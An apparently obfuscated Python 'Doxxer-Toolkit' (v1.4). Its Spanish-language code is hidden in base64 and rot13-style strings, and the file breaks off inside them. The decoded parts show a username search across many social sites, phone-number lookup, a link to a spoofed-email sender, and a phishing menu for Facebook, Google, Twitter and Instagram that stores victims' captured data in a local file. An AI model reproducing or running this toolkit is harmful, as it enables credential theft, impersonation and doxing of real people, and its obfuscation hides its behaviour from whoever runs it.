#---- Herramienta de Codigo cerrado ---- #
import base64, codecs
magic = 'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCByYW5kb20KaW1wb3J0IHB5c2hvcnRlbmVycwppbXBvcnQgcGhvbmVudW1iZXJzCmZyb20gcGhvbmVudW1iZXJzIGltcG9ydCBnZW9jb2RlciwgY2FycmllciwgdGltZXpvbmUKaW1wb3J0IHFyY29kZQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IFBJTApmcm9tIGZha2VyIGltcG9ydCBGYWtlcgpmcm9tIGxvbCBpbXBvcnQgUGhvbmVEb3gKaW1wb3J0IHdlYmJyb3dzZXIKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCgpjbGFzcyBDb2xvcmVzOgogIHJlZD0iXDAzM1szMTsxbSIKICB2ZXJkZT0iXDAzM1s5Mm0iCiAgYXp1bD0iXDAzM1s5NG0iCiAgbWFnZW50YT0iXDAzM1szNm0iCiAgYW1hcmlsbG89IlwwMzNbMzNtIgogIApvcy5zeXN0ZW0oImtpbGxhbGwgcGhwIikKb3Muc3lzdGVtKCJjbGVhciIpCnJhbmRvbWNvbG9yPVtDb2xvcmVzLnJlZCxDb2xvcmVzLnZlcmRlLENvbG9yZXMuYXp1bCxDb2xvcmVzLm1hZ2VudGFdCiNyYW5kb20uc2h1ZmZsZShyYW5kb21jb2xvcikKbG9nbyA9IENvbG9yZXMucmVkICsgJycnCsK34paE4paE4paE4paEICAgICAgICDilpDiloTigKIg4paEIOKWkOKWhOKAoiDiloQg4paE4paE4paEIC7iloTiloTiloQgICAgICDiloTiloTiloTiloTiloQgICAgICAgICAgICDiloTiloTilowgIOKWhCDigKLiloQg4paqICDiloTiloTiloTiloTiloQK4paI4paI4paqIOKWiOKWiCDilqogICAgICDilojilozilojilozilqog4paI4paM4paI4paM4paq4paA4paELuKWgMK34paA4paEIOKWiMK3ICAgIOKAouKWiOKWiCAg4paqICAgICDilqogICAgIOKWiOKWiOKAoiAg4paI4paM4paE4paM4paq4paI4paIIOKAouKWiOKWiCAgCuKWkOKWiMK3IOKWkOKWiOKWjCDiloTilojiloDiloQgIMK34paI4paIwrcgIMK34paI4paIwrcg4paQ4paA4paA4paq4paE4paQ4paA4paA4paEICAgICAg4paQ4paILuKWqiDiloTilojiloDiloQgIOKWhOKWiOKWgOKWhCDilojilojilqogIOKWkOKWgOKWgOKWhMK34paQ4paIwrcg4paQ4paILuKWqgrilojiloguIOKWiOKWiCDilpDilojilowu4paQ4paM4paq4paQ4paIwrfilojilozilqrilpDilojCt+KWiOKWjOKWkOKWiOKWhOKWhOKWjOKWkOKWiOKAouKWiOKWjCAgICAg4paQ4paI4paMwrfilpDilojilowu4paQ4paM4paQ4paI4paMLuKWkOKWjOKWkOKWiOKWjOKWkOKWjOKWkOKWiC7ilojilozilpDilojilowg4paQ4paI4paMwrcK4paA4paA4paA4paA4paA4oCiICDiloDilojiloTiloDilqrigKLiloDiloAg4paA4paA4oCi4paA4paAIOKWgOKWgCDiloDiloDiloAgLuKWgCAg4paAICAgICDiloDiloDiloAgIOKWgOKWiOKWhOKWgOKWqiDiloDilojiloTiloDilqou4paA4paA4paAIMK34paAICDiloDiloDiloDiloAg4paA4paA4paAIAogICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgQnk6ICBFdXJvbnltb3U1CiAgICAgICAgICAgICAgICAgICAgX19fX19fX19fX19fX19fCgogICAgICAgICAgICAgICAgICAgICBWZXJzaW9uOiB2MS40CiAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX18KJycnCgpkZWYgc2hlcigpOgogIHByaW50KGYne0NvbG9yZXMudmVyZGV9W35dIEF0ZW5jaW9uIG5vIHNpZW1wcmUgbG9zIHJlc3VsdGFkb3Mgc29uIDEwMCUgcHJlY2lzb3MnKQogIHVzdWFyaW8gPSBpbnB1dChmJ3tDb2xvcmVzLnJlZH1bfl0gSW5ncmVzYSBlbCBub21icmUgZGVsIHVzdWFyaW86ICcpCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tLyIgKyB1c3VhcmlvCiAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBJbnN0YWdyYW0hOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIEluc3RhZ3JhbSEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLVR3aXR0ZXItLS0tLS0tLS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL3R3aXR0ZXIuY29tLyIgKyB1c3VhcmlvCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIFR3aXR0ZXIhOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIFR3aXR0ZXIhJykKICAgIHRpbWUuc2xlZXAoMikKICAjLS0tLS0tLS0tLS0tLS1SZWRpdHQtLS0tLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vd3d3LnJlZGRpdC5jb20vdXNlci8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiByZWRkaXQhOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIHJlZGRpdCEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLVBpbnRpcmVzdC0tLS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9IGYiaHR0cHM6Ly93d3cucGludGVyZXN0LmNvbS97dXN1YXJpb30vIgogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyBlbiBQaW50ZXJlc3QhOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIFBpbnRlcmVzdCEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLVBvcm5odWItLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vcG9ybmh1Yi5jb20vdXNlcnMvIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gUG9ybmh1YiE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gUG9ybmh1YiEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLS0tLVlvdXR1YmUtLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly93d3cueW91dHViZS5jb20vIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gWW91dHViZSE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gWW91dHViZSEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLS1YYm94LS0tLS0tLS0tLS0tLS0tLS0tCiAgcHJpbnQoJyAnKQogIHVybCA9ICJodHRwczovL3hib3hnYW1lcnRhZy5jb20vc2VhcmNoLyIgKyB1c3VhcmlvCiAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgcmVzcG9uc2UuY2xvc2UoKQogICAgcHJpbnQoZidbfl0gVXN1YXJpbyBlbmNvbnRyYWRvIGVuIFhib3ghOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIFhib3ghJykKICAgIHRpbWUuc2xlZXAoMikKICAjLS0tLS0tLS0tLS0tLS0tLS0tLS0tU3BvdGlmeS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly9vcGVuLnNwb3RpZnkuY29tL3VzZXIvIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gU3BvdGlmeSE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gU3BvdGlmeSEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS0tLS1QYXRyZW9uLS0tLS0tLS0tLS0tLQogIHByaW50KCcgJykKICB1cmwgPSAiaHR0cHM6Ly93d3cucGF0cmVvbi5jb20vIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gUGF0cmVvbiE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gUGF0cmVvbiEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS1NeXNwYWNlLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vbXlzcGFjZS5jb20vIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gTXlzcGFjZSE6IHt1cmx9JykKICAgIHRpbWUuc2xlZXAoMikKICBlbHNlOgogICAgcHJpbnQoJ1t+XSBVc3VhcmlvIG5vIGVuY29udHJhZG8gZW4gTXlzcGFjZSEnKQogICAgdGltZS5zbGVlcCgyKQogICMtLS0tLS0tLS0tLS0tLS1NeWFuaW1lbGlzdC0tLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vbXlhbmltZWxpc3QubmV0L3Byb2ZpbGUvIiArIHVzdWFyaW8KICBpZiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICByZXNwb25zZS5jbG9zZSgpCiAgICBwcmludChmJ1t+XSBVc3VhcmlvIGVuY29udHJhZG8gZW4gTXlhbmltZWxpc3QhOiB7dXJsfScpCiAgICB0aW1lLnNsZWVwKDIpCiAgZWxzZToKICAgIHByaW50KCdbfl0gVXN1YXJpbyBubyBlbmNvbnRyYWRvIGVuIE15YW5pbWVsaXN0IScpCiAgICB0aW1lLnNsZWVwKDIpCiAgIy0tLS0tLS0tLS0tLS0tLS0tR2l0aHViLS0tLS0tLS0tLS0tLS0KICBwcmludCgnICcpCiAgdXJsID0gImh0dHBzOi8vZ2l0aHViLmNvbS8iICsgdXN1YXJpbwogIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgIHJlc3BvbnNlLmNsb3NlKCkKICAgIHByaW50KGYnW35dIFVzdWFyaW8gZW5jb250cmFkbyB'
love = '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'
god = 'BwcmluY2lwYWwnKQogIHByaW50KCdcbls5OV0gU2FsaXInKQogIE9QID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpCiAgaWYgT1AgPT0gMToKICAgIG9zLnN5c3RlbSgiY2xlYXIiKQogICAgcHJpbnQobG9nbykKICAgIHByaW50KCdcblsxXSBBYnJpciBsaW5rIHBhcmEgbGludXgnKQogICAgcHJpbnQoJ1xuWzJdIEFicmlyIGxpbmsgcGFyYSB0ZXJtdXgnKQogICAgcHJpbnQoJ1xuWzAwXSBSZWdyZXNhciBhbCBtZW51IHByaW5jaXBhbCcpCiAgICBwcmludCgnXG5bOTldIFNhbGlyJykKICAgIGJydWggPSBpbnQoaW5wdXQoJ1t+XSBFbGlqZSB1bmEgb3BjaW9uOiAnKSkKICAgIGlmIGJydWggPT0gMToKICAgICAgd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL2Vta2VpLmN6LycpCiAgICAgIGVtYWlsZmFrKCkKICAgIGVsaWYgYnJ1aCA9PSAyOgogICAgICBvcy5zeXN0ZW0oInRlcm11eC1vcGVuIGh0dHBzOi8vZW1rZWkuY3ovIikKICAgICAgZW1haWxmYWsoKQogICAgZWxpZiBicnVoID09IDAwOgogICAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgICAgcHJpbnQobG9nbykKICAgICAgZW1haWxmYWsoKQogICAgZWxpZiBicnVoID09IDk5OgogICAgICBleGl0KCkKICAgIGVsc2U6CiAgICAgICBwcmludCgnW35dIEVycm9yIG9wY2lvbiBpbnZhbGlkYS4nKQogICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgZW1haWxmYWsoKQogIGVsaWYgT1AgPT0gMDA6CiAgICBtZW51KCkKICBlbGlmIE9QID09IDk5OgogICAgZXhpdCgpCiAgZWxzZToKICAgIHByaW50KCdbfl0gRXJyb3Igb3BjaW9uIGludmFsaWRhLicpCiAgICB0aW1lLnNsZWVwKDIpCiAgICBvcy5zeXN0ZW0oImNsZWFyIikKICAgIHByaW50KGxvZ28pCiAgICBlbWFpbGZhaygpCiAgCmRlZiBwaGlzaGluZygpOgogIG9zLnN5c3RlbSgiY2xlYXIiKQogIHByaW50KGxvZ28pCiAgcHJpbnQoJ1xuW35dIFNlbGVjY2lvbmEgdW5hIG9wY2lvbicpCiAgcHJpbnQoJycnCiAgWzFdIEZhY2Vib29rCiAgCiAgWzJdIEdvb2dsZQogIAogIFszXSBUd2l0dGVyCiAgCiAgWzRdIEluc3RhZ3JhbQogIAogIFswMF0gUmVncmVzYXIgYWwgbWVudSBwcmluY2lwYWwKICAKICBbOTldIFNhbGlyCiAgJycnKQogIFlQID0gaW50KGlucHV0KCdbfl0gRWxpamUgdW5hIG9wY2lvbjogJykpCiAgaWYgWVAgPT0gMToKICAgIHByaW50KGYnXG57Q29sb3Jlcy5henVsfVt+XSBMb3MgdXN1YXJpb3Mgc2UgZ3VhcmRhcmFuIGVuOiBEb3h4ZXItVG9vbGtpdC8ucGFnZXMvRmFjZWJvb2svdXN1YXJpb3MudHh0JykKICAgIHByaW50KGYnXG57Q29sb3Jlcy52ZXJkZX1bfl0gTG9zIHB1ZWRl